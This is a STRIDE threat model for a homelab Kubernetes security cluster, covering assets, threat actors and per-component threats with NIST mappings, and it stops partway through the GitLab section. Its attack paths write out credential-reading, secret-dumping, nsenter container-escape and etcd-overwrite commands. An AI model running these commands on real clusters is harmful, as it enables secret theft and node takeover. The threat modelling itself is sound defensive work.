# Threat Model — Homelab Kubernetes Security Cluster

**Document ID:** TM-K8S-001  
**Version:** 1.0  
**Classification:** Internal / Lab Use  
**Author:** Jason A. Slocomb  
**Date:** 2026-03-02  
**Framework:** STRIDE (Microsoft Threat Modeling Methodology)  
**Compliance Mapping:** NIST SP 800-171 Rev 2 / CMMC Level 2

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [System Overview](#2-system-overview)
3. [Architecture and Trust Boundaries](#3-architecture-and-trust-boundaries)
4. [Assets and Crown Jewels](#4-assets-and-crown-jewels)
5. [Threat Actors](#5-threat-actors)
6. [STRIDE Analysis by Component](#6-stride-analysis-by-component)
   - 6.1 [Kubernetes API Server](#61-kubernetes-api-server-kube-apiserver)
   - 6.2 [etcd (State Store)](#62-etcd-state-store)
   - 6.3 [Kubelet (Node Agent)](#63-kubelet-node-agent)
   - 6.4 [FreeIPA / Identity Provider](#64-freeipa--identity-provider)
   - 6.5 [GitLab CE (CI/CD Pipeline)](#65-gitlab-ce-cicd-pipeline)
   - 6.6 [AWX / Ansible Automation](#66-awx--ansible-automation)
   - 6.7 [Splunk SIEM](#67-splunk-siem)
   - 6.8 [Container Registry](#68-container-registry)
   - 6.9 [Ingress Controller](#69-ingress-controller)
   - 6.10 [Pod-to-Pod Network (East-West)](#610-pod-to-pod-network-east-west)
   - 6.11 [Kubernetes Secrets](#611-kubernetes-secrets)
   - 6.12 [Longhorn Storage](#612-longhorn-storage)
   - 6.13 [Monitoring Stack (Zabbix / Grafana / Prometheus)](#613-monitoring-stack-zabbix--grafana--prometheus)
   - 6.14 [Node OS (Rocky Linux 9)](#614-node-os-rocky-linux-9)
7. [Cross-Cutting Threats](#7-cross-cutting-threats)
8. [Threat Summary Matrix](#8-threat-summary-matrix)
9. [Mitigations and Controls](#9-mitigations-and-controls)
10. [NIST 800-171 Control Mapping](#10-nist-800-171-control-mapping)
11. [Residual Risk Register](#11-residual-risk-register)
12. [Review and Maintenance](#12-review-and-maintenance)

---

## 1. Executive Summary

This document presents a formal STRIDE threat model for the homelab Kubernetes security cluster. The cluster serves dual purpose: as a hands-on security engineering portfolio demonstrating CMMC Level 2 compliance architecture, and as a realistic simulation environment for incident response, detection engineering, and infrastructure-as-code practices.

The cluster runs RKE2 (CIS-hardened) on Rocky Linux 9 and hosts a full enterprise security stack including FreeIPA identity management, Splunk SIEM, GitLab CE CI/CD, AWX automation, Zabbix and Prometheus monitoring, Longhorn distributed storage, and NetBox IPAM. This diversity of services significantly expands the attack surface relative to a minimal cluster and makes thorough threat modeling essential.

**Key findings from this analysis:**

- The **kube-apiserver** and **etcd** represent the highest-risk targets; compromise of either constitutes full cluster compromise.
- The **CI/CD pipeline** (GitLab → AWX → cluster) is the most likely real-world attack path in a lab context where supply chain and insider threat vectors are active concerns.
- **Secret management** is a systemic risk: Kubernetes-native secrets are base64-encoded at rest in etcd by default; encryption at rest and external secret management are required controls.
- **Lateral movement** through the pod network is unimpeded without a network policy enforcement engine (Cilium or Calico in enforcing mode).
- **FreeIPA integration** centralizes identity but also centralizes identity risk; a compromise of `ipa01` can propagate to all OIDC-authenticated services simultaneously.

**Risk posture:** HIGH without the mitigations defined in Section 9. MEDIUM with full mitigation implementation. Target posture for CMMC Level 2 demonstration: LOW residual risk on all critical assets.

---

## 2. System Overview

### 2.1 Cluster Topology

```
┌─────────────────────────────────────────────────────────────────┐
│                     Lab Network (192.168.x.x)                    │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │                  Proxmox Hypervisor Host                  │    │
│  │                                                           │    │
│  │  ┌─────────────┐   ┌──────────────────────────────────┐  │    │
│  │  │   ipa01     │   │        RKE2 Cluster               │  │    │
│  │  │  FreeIPA    │   │                                   │  │    │
│  │  │  DNS / LDAP │   │  ┌──────────┐  ┌─────────────┐  │  │    │
│  │  │  OIDC IdP   │   │  │ k8s-cp01 │  │  k8s-w01    │  │  │    │
│  │  └──────┬──────┘   │  │ Control  │  │  GitLab CE  │  │  │    │
│  │         │ OIDC     │  │ Plane    │  │  AWX        │  │  │    │
│  │         └──────────┼──┤ etcd     │  │  Splunk     │  │  │    │
│  │                    │  │ API Srvr │  └─────────────┘  │  │    │
│  │                    │  └──────────┘                    │  │    │
│  │                    │             ┌─────────────────┐  │  │    │
│  │                    │             │    k8s-w02      │  │  │    │
│  │                    │             │  Prometheus     │  │  │    │
│  │                    │             │  Grafana        │  │  │    │
│  │                    │             │  Zabbix         │  │  │    │
│  │                    │             │  NetBox         │  │  │    │
│  │                    │             └─────────────────┘  │  │    │
│  │                    └──────────────────────────────────┘  │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                   │
│  ┌──────────────┐                                                 │
│  │ Admin       │  <- kubectl, SSH, Ansible playbooks              │
│  │ Workstation │                                                   │
│  └──────────────┘                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Technology Stack

| Layer | Technology | Version | Role |
|---|---|---|---|
| Hypervisor | Proxmox VE | 8.x | VM host |
| OS | Rocky Linux 9 | 9.x | Node base OS |
| Container runtime | containerd | 1.7.x | CRI |
| Kubernetes | RKE2 (CIS profile) | 1.28.x | Orchestration |
| Identity | FreeIPA | 4.11.x | IdP / LDAP / Kerberos |
| CI/CD | GitLab CE | 16.x | Source control + pipelines |
| Automation | AWX | 23.x | Ansible execution |
| SIEM | Splunk Enterprise | 9.x | Log aggregation / detection |
| Monitoring | Zabbix + Prometheus | 6.4 / 2.x | Metrics + alerting |
| Dashboards | Grafana | 10.x | Visualization |
| IPAM/DCIM | NetBox | 3.7 | Network documentation |
| Storage | Longhorn | 1.6 | Distributed PVs |
| Ingress | NGINX Ingress | 1.9.x | L7 proxy |
| GitOps | Argo CD | 2.9.x | Continuous delivery |
| Secret mgmt | Sealed Secrets / Vault | - | Secret handling |
| FIM | AIDE | 0.17 | File integrity |

---

## 3. Architecture and Trust Boundaries

Trust boundaries define where data crosses security domains. Threats most commonly manifest at these transitions.

### Trust Boundary Map

```
TB-1:  External Internet    →  Lab Network          (firewall / NAT)
TB-2:  Lab Network          →  Ingress Controller   (TLS termination)
TB-3:  Ingress              →  Pod network          (cluster-internal)
TB-4:  Pod                  →  kube-apiserver       (RBAC + authn)
TB-5:  kube-apiserver       →  etcd                 (mTLS, internal only)
TB-6:  Node kubelet         →  kube-apiserver       (client cert authn)
TB-7:  FreeIPA              →  kube-apiserver       (OIDC token validation)
TB-8:  GitLab CI            →  cluster              (kubeconfig / SA token)
TB-9:  AWX                  →  cluster              (ServiceAccount token)
TB-10: Admin workstation    →  kube-apiserver       (kubeconfig, mTLS)
TB-11: Monitoring agents    →  scraped services     (network access)
TB-12: Backup jobs          →  Longhorn volumes     (PV access)
```

### Trust Levels (High to Low)

| Level | Actors | Implicit Trust |
|---|---|---|
| L0 — Hypervisor | Proxmox root | Full host trust |
| L1 — Control Plane | kube-apiserver, etcd, controller-manager, scheduler | Kubernetes root trust |
| L2 — Node OS | kubelet, containerd, node root | Host-level trust |
| L3 — Privileged Workloads | Splunk, AWX, system DaemonSets | Elevated cluster trust |
| L4 — Standard Workloads | GitLab, Grafana, NetBox, Zabbix | Normal pod trust |
| L5 — Users | Admin via kubectl, pipeline service accounts | Authenticated trust |
| L6 — External | Internet, unauthenticated inbound | Untrusted |

---

## 4. Assets and Crown Jewels

### 4.1 Critical Assets (Compromise = Full Cluster Loss)

| Asset | Location | Why Critical |
|---|---|---|
| etcd data store | k8s-cp01:/var/lib/etcd | Contains all K8s state including Secrets; full cluster state |
| kube-apiserver TLS private key | k8s-cp01:/etc/kubernetes/ssl/ | Allows impersonating the API server to all clients |
| etcd client certificates | k8s-cp01:/etc/kubernetes/ssl/ | Allow direct etcd access bypassing all Kubernetes RBAC |
| cluster-admin kubeconfig | Admin workstation, CI/CD vars | Full cluster privileges with no audit trail if shared |
| FreeIPA root / admin credentials | ipa01 | Identity compromise propagates to all OIDC-integrated services |
| Node root SSH keys | All nodes | Enables container escapes and kubelet abuse |

### 4.2 High-Value Assets

| Asset | Location | Impact of Compromise |
|---|---|---|
| GitLab root credentials | k8s-w01 (GitLab pod) | Source code exfiltration; malicious pipeline injection |
| Splunk admin credentials | k8s-w01 (Splunk pod) | Log deletion/tampering; blinding detection capability |
| AWX admin credentials | k8s-w01 (AWX pod) | Arbitrary Ansible execution against all managed hosts |
| Longhorn volume data | k8s-w01, k8s-w02 | Persistent data including database files and configs |
| CI/CD kubeconfigs / tokens | GitLab CI variables | Cluster access from pipeline context |
| Zabbix agent credentials | All nodes | Lateral movement path to monitoring infrastructure |

### 4.3 Sensitive Data in Transit

- Kerberos TGTs / service tickets (FreeIPA to services)
- OIDC id_tokens (FreeIPA to kube-apiserver)
- ServiceAccount JWT tokens (pods to kube-apiserver)
- Ansible Vault passwords (AWX to playbook execution)
- Splunk HEC tokens (all nodes to Splunk)
- Container image pull secrets (nodes to registry)

---

## 5. Threat Actors

### 5.1 Actor Profiles

**TA-1: External Attacker**
Motivation: Opportunistic exploitation, botnet recruitment, credential harvesting, pivoting into connected networks. No prior knowledge of the environment. Primarily targets exposed services at TB-1/TB-2.

**TA-2: Compromised Supply Chain**
Motivation: Persistent access, data exfiltration. Operates through malicious container images, compromised upstream dependencies, or trojanized Ansible roles / Helm charts. Bypasses perimeter controls entirely.

**TA-3: Malicious Insider / Former Admin**
Motivation: Sabotage, data theft, credential abuse. Has prior knowledge of the architecture, may retain stale credentials or kubeconfigs. Most dangerous actor because they understand trust relationships.

**TA-4: Compromised CI/CD Pipeline**
Motivation: Persistent cluster access, secret exfiltration. Operates through a compromised GitLab runner, hijacked pipeline variables, or poisoned `.gitlab-ci.yml`. Has the same cluster access as the CI ServiceAccount.

**TA-5: Compromised Workload (Container Escape)**
Motivation: Node-level access, pivot to control plane. Exploits a vulnerability in a running container to break out to the host OS, then leverages node identity to access the API server.

**TA-6: Lateral Movement from Adjacent System**
Motivation: Escalation of access. Originates from a compromised lab-adjacent host (admin workstation, Proxmox host) and moves into the cluster via exposed APIs or stolen credentials.

---

## 6. STRIDE Analysis by Component

> **STRIDE Key:**
> **S** = Spoofing | **T** = Tampering | **R** = Repudiation | **I** = Information Disclosure | **D** = Denial of Service | **E** = Elevation of Privilege
>
> **Risk levels:** CRITICAL / HIGH / MEDIUM / LOW  
> **Likelihood:** HIGH / MEDIUM / LOW (without mitigations in place)

---

### 6.1 Kubernetes API Server (kube-apiserver)

The kube-apiserver is the single control plane endpoint for all cluster state operations. Every kubectl command, controller reconciliation loop, and workload identity check passes through it. It is the most critical component to protect and the most attractive target.

---

#### S — Spoofing

**S-1.1 | CRITICAL — Stolen kubeconfig impersonation**

An attacker who obtains a valid kubeconfig can authenticate as the corresponding user with no further exploitation required. Kubeconfig credentials include either a client certificate+key pair or a bearer token; both grant API access as the named principal with no second factor required.

> *Attack path:* Attacker exfiltrates `~/.kube/config` from admin workstation via phishing or endpoint compromise → presents valid client certificate → executes as `cluster-admin` with no alerting unless audit logging captures the source IP deviation.

*Threat actors:* TA-1, TA-3, TA-4 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

**S-1.2 | HIGH — ServiceAccount token theft from pod filesystem**

ServiceAccount JWT tokens are projected into pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Long-lived tokens (created as Secrets of type `kubernetes.io/service-account-token`, common before K8s 1.24) remain valid until explicitly revoked. A workload exploit that achieves code execution in a pod gives the attacker this token, which can then be used from any network-accessible location to authenticate to the API server.

> *Attack path:* RCE via web application vulnerability in GitLab → `cat /var/run/secrets/kubernetes.io/serviceaccount/token` → use token from attacker-controlled host to interact with API server as the GitLab service account.

*Threat actors:* TA-2, TA-5 | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users)

---

**S-1.3 | HIGH — OIDC token replay attack**

If OIDC tokens (issued by FreeIPA) are intercepted in transit — for example, over an internal network segment assumed to be trusted but lacking TLS — an attacker can replay the token for its full validity window (typically 1 hour). The kube-apiserver validates the token signature against the IdP's public keys but has no mechanism to detect replays unless token binding is implemented.

> *Attack path:* Attacker MITMs the segment between admin workstation and ipa01 → captures OIDC id_token → replays against kube-apiserver within validity window → authenticated as the captured identity.

*Threat actors:* TA-1, TA-3 | *NIST:* [IA-3.5.2](cmmc-mapping.md#ia-352--authenticate-devices), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**S-1.4 | MEDIUM — Node identity certificate spoofing**

Nodes authenticate to the kube-apiserver with client certificates bearing `CN=system:node:<nodename>` in the `system:nodes` group. If an attacker compromises a node's private key (stored at `/etc/kubernetes/ssl/`) or obtains a certificate for a fabricated node name, they can request secrets associated with pods scheduled on any node.

*Threat actors:* TA-5, TA-6 | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

#### T — Tampering

**T-1.1 | CRITICAL — Malicious admission webhook injection**

A malicious or compromised `MutatingAdmissionWebhook` can intercept all pod creation/update requests and silently modify them before they are written to etcd — injecting environment variables, volumes, init containers, or privileged flags. Because mutation happens server-side, the user's `kubectl apply` output shows their original spec while the cluster runs something entirely different.

> *Attack path:* Attacker gains write access to cluster via stolen SA token → registers a `MutatingAdmissionWebhook` targeting all pods → webhook adds `hostPID: true` and a malicious init container to every new pod → attacker achieves node-level access on next deployment by any user.

*Threat actors:* TA-3, TA-4, TA-5 | *NIST:* [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**T-1.2 | HIGH — RBAC policy privilege escalation**

An attacker with write access to `ClusterRole` or `Role` objects can grant themselves or a controlled service account additional permissions, including `cluster-admin`. RBAC policies are stored in etcd and evaluated at request time; a subtle policy change (adding `verbs: ["*"]` to an existing binding) may go undetected without continuous RBAC diff monitoring.

> *Attack path:* Compromised GitLab pipeline ServiceAccount has `rbac.authorization.k8s.io` create rights → pipeline creates a new `ClusterRoleBinding` granting `cluster-admin` to a controlled service account → attacker escalates from pipeline-scoped access to full cluster control.

*Threat actors:* TA-4, TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes)

---

**T-1.3 | MEDIUM — Audit log tampering or suppression**

If the Splunk HEC endpoint is reachable from within the cluster and lacks source validation, a compromised workload can flood the audit stream with noise or inject fabricated events. If the kube-apiserver's local audit log is written to a `hostPath` volume writable by a container, individual log entries can be deleted before ingestion.

*Threat actors:* TA-3, TA-5 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [AU-3.3.2](cmmc-mapping.md#au-332--ensure-actions-can-be-traced-to-users)

---

#### R — Repudiation

**R-1.1 | HIGH — Shared kubeconfig prevents actor attribution**

When multiple pipeline jobs or administrators share a single kubeconfig or ServiceAccount token, audit logs record the identity of the credential but not the specific human, job stage, or branch responsible for an action. If a destructive change is made, determining who triggered it requires manual cross-referencing of GitLab pipeline logs with API server audit timestamps — a process that is slow and error-prone under incident conditions.

*Threat actors:* TA-3, TA-4 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**R-1.2 | MEDIUM — Impersonation without full request capture**

The kube-apiserver supports an `Impersonate-User` header allowing privileged users to act as another identity. Audit log entries record both the original user and the impersonated user, but if the audit policy logs only at `Metadata` level (not `RequestResponse`), the actual content of the impersonated action — what resource was read, what value was returned — is not captured.

*Threat actors:* TA-3 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users)

---

#### I — Information Disclosure

**I-1.1 | CRITICAL — Secret enumeration via over-privileged list/get**

Any principal with `list` or `get` on `secrets` in any namespace can read all secrets in that namespace in plaintext (base64-decoded from the API response), including database passwords, TLS private keys, cloud provider credentials, and service account tokens. A single over-privileged ServiceAccount — a common finding in real environments — represents a wide blast radius.

> *Attack path:* Attacker compromises a monitoring service account → `kubectl get secrets -n production -o yaml` → extracts all secrets in seconds with no rate limiting.

*Threat actors:* TA-4, TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**I-1.2 | HIGH — API discovery leaking resource layout**

The `/api`, `/apis`, and `/openapi/v2` endpoints enumerate all resource types, custom resources, and installed operators to any authenticated principal by default. An attacker uses these endpoints to build a complete map of the available attack surface — running operators, custom resource definitions, installed admission webhooks — without triggering most alert rules (these discovery calls are typically not suspicious).

*Threat actors:* TA-1, TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks)

---

**I-1.3 | HIGH — Verbose API error messages leaking internals**

kube-apiserver 4xx/5xx error responses can include internal details: node names, namespace structures, internal service addresses, and user group information. If the Ingress layer forwards these responses verbatim to external clients (a misconfigured proxy config), reconnaissance becomes trivial from outside the lab network.

*Threat actors:* TA-1 | *NIST:* [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

#### D — Denial of Service

**D-1.1 | HIGH — API server resource exhaustion via expensive list operations**

The kube-apiserver is a single-process server in a single-control-plane lab deployment. A flood of expensive watch/list requests — particularly `list secrets --all-namespaces` with no field selector — can consume all available memory and CPU, causing OOM kills or unresponsiveness. In a lab with one control-plane node, this is a hard outage requiring manual intervention.

*Threat actors:* TA-1, TA-5 | *NIST:* [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks), [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries)

---

**D-1.2 | MEDIUM — Webhook timeout cascade**

A slow or crashing `ValidatingAdmissionWebhook` set to `failurePolicy: Fail` blocks all matching resource creation until the webhook times out (default 10 seconds per request). If the webhook is hosted within the same cluster, a pod crash-loop in the webhook deployment prevents all new pod scheduling — cascading into a cluster-wide availability failure that is difficult to diagnose under pressure.

*Threat actors:* TA-2, TA-5 | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [SI-3.14.2](cmmc-mapping.md#si-3142--provide-protection-from-malicious-code)

---

#### E — Elevation of Privilege

**E-1.1 | CRITICAL — Privileged pod container escape**

A workload created with `privileged: true` in its `SecurityContext` has full access to the host's kernel namespaces and devices. From this position, escaping the container boundary is trivial: mount the host filesystem, read node service account tokens, or use `nsenter` to enter the host's process namespace. In a CIS-hardened cluster, creating privileged pods is blocked by PodSecurity admission — but a namespace missing the required labels leaves this path wide open.

> *Attack path:* Attacker with pod-create rights in a namespace lacking PodSecurity enforcement → deploys `privileged: true, hostPID: true` pod → `nsenter --target 1 --mount --uts --ipc --net /bin/bash` → root shell on node OS → node is fully compromised.

*Threat actors:* TA-4, TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**E-1.2 | HIGH — Excessive cluster-admin ClusterRoleBinding grants**

RKE2 installations include several `cluster-admin` bindings for system components. Any service account bound to `cluster-admin` that is compromised — or any account to which an additional `cluster-admin` ClusterRoleBinding is added without detection — gives the attacker full, unrestricted access to the cluster.

*Threat actors:* TA-3, TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes)

---

### 6.2 etcd (State Store)

etcd is the authoritative source of truth for all Kubernetes state. Because Kubernetes Secrets are stored in etcd as base64-encoded values — not encrypted — by default, direct etcd access bypasses all Kubernetes RBAC controls entirely. There is no authorization layer between a valid etcd client and the data.

---

#### S — Spoofing

**S-2.1 | CRITICAL — etcd client certificate forgery**

etcd requires mTLS for all client connections. The etcd CA is separate from the Kubernetes CA in a properly hardened deployment. If the etcd CA private key is compromised — typically stored at `/etc/kubernetes/ssl/etcd/` on the control plane node — an attacker can generate valid client certificates for any principal and connect directly to etcd with full read/write access.

*Threat actors:* TA-3, TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users)

---

#### T — Tampering

**T-2.1 | CRITICAL — Direct etcd write bypassing all RBAC**

With valid etcd credentials, an attacker can write arbitrary data directly to etcd using `etcdctl`, including creating or overwriting Secrets, modifying RBAC policies, and creating privileged pods — without triggering a single kube-apiserver audit log entry. RBAC is implemented in the API server, not etcd; direct etcd access is completely unmediated by any authorization layer.

> *Attack path:* Attacker with control-plane host access → retrieves etcd client certs from `/etc/kubernetes/ssl/etcd/` → `etcdctl put /registry/secrets/production/aws-credentials <malicious_value>` → legitimate workload now reads attacker-controlled credentials on next access. No audit event ever appears.

*Threat actors:* TA-3, TA-5 | *NIST:* [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

**T-2.2 | HIGH — etcd backup snapshot exfiltration**

etcd snapshots (`etcdctl snapshot save`) contain the complete cluster state, including all Secrets encoded in base64. Backup jobs that write snapshots to shared NFS mounts, unencrypted object storage, or any location with broader access than the control plane itself create a durable copy of all cluster secrets that persists even after secrets are rotated in the live cluster.

*Threat actors:* TA-3, TA-4 | *NIST:* [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

#### I — Information Disclosure

**I-2.1 | CRITICAL — Secrets stored at rest without encryption**

By default, Kubernetes (including RKE2) does **not** encrypt Secret objects at rest in etcd. An attacker with read access to the etcd data directory (`/var/lib/etcd/member/`) — achievable by compromising the control plane node, accessing a backup, or reading a snapshot — can extract all secrets in base64 using standard tooling in minutes.

> *Mitigation:* Configure `--encryption-provider-config` on the kube-apiserver using the `secretbox` or `aescbc` provider. This is a P1 remediation item.

*Threat actors:* TA-3, TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui)

---

#### D — Denial of Service

**D-2.1 | HIGH — Single-node etcd quorum disruption**

In a single-node etcd deployment (standard for lab clusters), any disruption to the etcd process — disk full, high I/O contention, OOM kill, or deliberate process termination — brings down the entire control plane. The kube-apiserver becomes read-only (serving cached state only) and all new workload scheduling halts until etcd is restored. Recovery requires etcd restore from backup, with potential data loss.

*Threat actors:* TA-1, TA-5 | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [SI-3.14.2](cmmc-mapping.md#si-3142--provide-protection-from-malicious-code)

---

### 6.3 Kubelet (Node Agent)

The kubelet is the primary node agent, responsible for pod lifecycle management. It exposes a local API on port 10250 (authenticated) and may expose read-only metrics on port 10255 (deprecated but present in some deployments). Kubelet compromise grants access to all pods running on that node.

---

#### S — Spoofing

**S-3.1 | HIGH — Unauthenticated kubelet API access**

If the kubelet's `--anonymous-auth=true` flag is set (the default in older distributions), the `https://<node>:10250/pods` endpoint is accessible without authentication. An attacker on the lab network can enumerate all pods and running containers. The `/exec` endpoint may allow arbitrary command execution in running containers without any Kubernetes RBAC check.

> RKE2 sets `--anonymous-auth=false` by default. Explicit verification via `curl -sk https://<node-ip>:10250/pods` should confirm this is blocked.

*Threat actors:* TA-1, TA-6 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users)

---

#### E — Elevation of Privilege

**E-3.1 | CRITICAL — Container escape via privileged pod to node OS**

As detailed in E-1.1, a privileged pod trivially escapes to the node OS. From node-level access, the attacker gains the kubelet's client certificate (for API server access), the container runtime socket (`/run/containerd/containerd.sock`, allowing creation of new containers outside Kubernetes control), and read access to all pod filesystems and their mounted secrets.

*Threat actors:* TA-5 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**E-3.2 | HIGH — Kubelet client certificate credential abuse**

The kubelet authenticates to the kube-apiserver with a client certificate bearing `CN=system:node:<nodename>`. Nodes have permission to read secrets associated with pods scheduled on them. An attacker who steals the kubelet client key can read secrets for any pod scheduled on that node by querying the kube-apiserver as the node identity — entirely within legitimate RBAC, appearing in audit logs only as routine kubelet operations.

*Threat actors:* TA-3, TA-5 | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users)

---

### 6.4 FreeIPA / Identity Provider

FreeIPA serves as the central identity provider, providing LDAP directory services, Kerberos authentication, DNS, and OIDC token issuance for kube-apiserver authentication. A compromise of FreeIPA propagates to every system that trusts it, making it the most impactful single point of failure in the identity layer.

---

#### S — Spoofing

**S-4.1 | CRITICAL — FreeIPA admin credential compromise**

The `admin` account in FreeIPA has full directory management capability: creating users, resetting passwords, modifying group memberships, issuing certificates, and managing LDAP access controls. Compromise allows an attacker to add themselves to any LDAP group, generate OIDC tokens for any user, or create new shadow identities invisible to user-facing audit tools.

*Threat actors:* TA-3, TA-6 | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

**S-4.2 | HIGH — Kerberos golden ticket attack**

If the `krbtgt` account's secret key is compromised (accessible via the FreeIPA server's Kerberos database, which lives on `ipa01`), an attacker can forge Ticket-Granting Tickets for any principal in the realm. Golden tickets do not require the target account to exist in LDAP, can have arbitrary validity windows (including years), and are not invalidated by password changes. Detection requires monitoring for tickets with anomalous service flags or validity periods.

*Threat actors:* TA-3 | *NIST:* [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users), [IA-3.5.2](cmmc-mapping.md#ia-352--authenticate-devices), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

#### T — Tampering

**T-4.1 | HIGH — LDAP group membership manipulation**

A user with LDAP write access can modify group memberships consumed by the kube-apiserver's OIDC group claims. Adding an account to `admins` or `cluster-operators` in LDAP directly via `ldapmodify` — rather than through the FreeIPA web UI — bypasses any approval workflow implemented at the application layer. The change takes effect on the next OIDC token issuance for that user.

*Threat actors:* TA-3 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes)

---

#### I — Information Disclosure

**I-4.1 | MEDIUM — LDAP anonymous bind exposing directory structure**

FreeIPA by default allows anonymous LDAP binds to read certain attributes (`cn`, `uid`, `mail`). An attacker on the lab network can enumerate all user accounts, service accounts, group memberships, and host principals without authentication. This provides a complete list of valid authentication targets for credential stuffing or targeted phishing.

*Threat actors:* TA-1, TA-6 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [AC-3.1.3](cmmc-mapping.md#ac-313--control-flow-of-cui)

---

#### D — Denial of Service

**D-4.1 | HIGH — FreeIPA outage cascades to all authentication**

All OIDC-authenticated services — kube-apiserver, GitLab, AWX, Grafana, Splunk — lose the ability to authenticate new sessions if FreeIPA is unavailable. In a single-IPA-server lab, any FreeIPA outage (disk full, process crash, network partition) causes a simultaneous authentication outage across all integrated services. Operators cannot log in to investigate or remediate.

> *Design note:* FreeIPA supports replica promotion via `ipa-replica-install`. A second IPA replica eliminates this single point of failure at the cost of an additional VM.

*Threat actors:* TA-1, TA-5 | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [SI-3.14.2](cmmc-mapping.md#si-3142--provide-protection-from-malicious-code)

---

### 6.5 GitLab CE (CI/CD Pipeline)

GitLab CE is the source control and CI/CD platform. It is a critical trust boundary: code committed to GitLab may be automatically applied to the cluster via pipelines. The security of the entire GitOps delivery chain depends on GitLab's integrity.

---

#### S — Spoofing

**S-5.1 | HIGH — CI/CD variable exfiltration via pipeline injection**

GitLab pipeline variables marked as "masked" are not printed in job output, but they are accessible as environment variables within the runner process. A malicious `.gitlab-ci.yml` — introduced through a merge request on an unprotected branch or directly on main by a compromised developer account — can exfiltrate all pipeline variables by encoding them and sending them to an external endpoint.

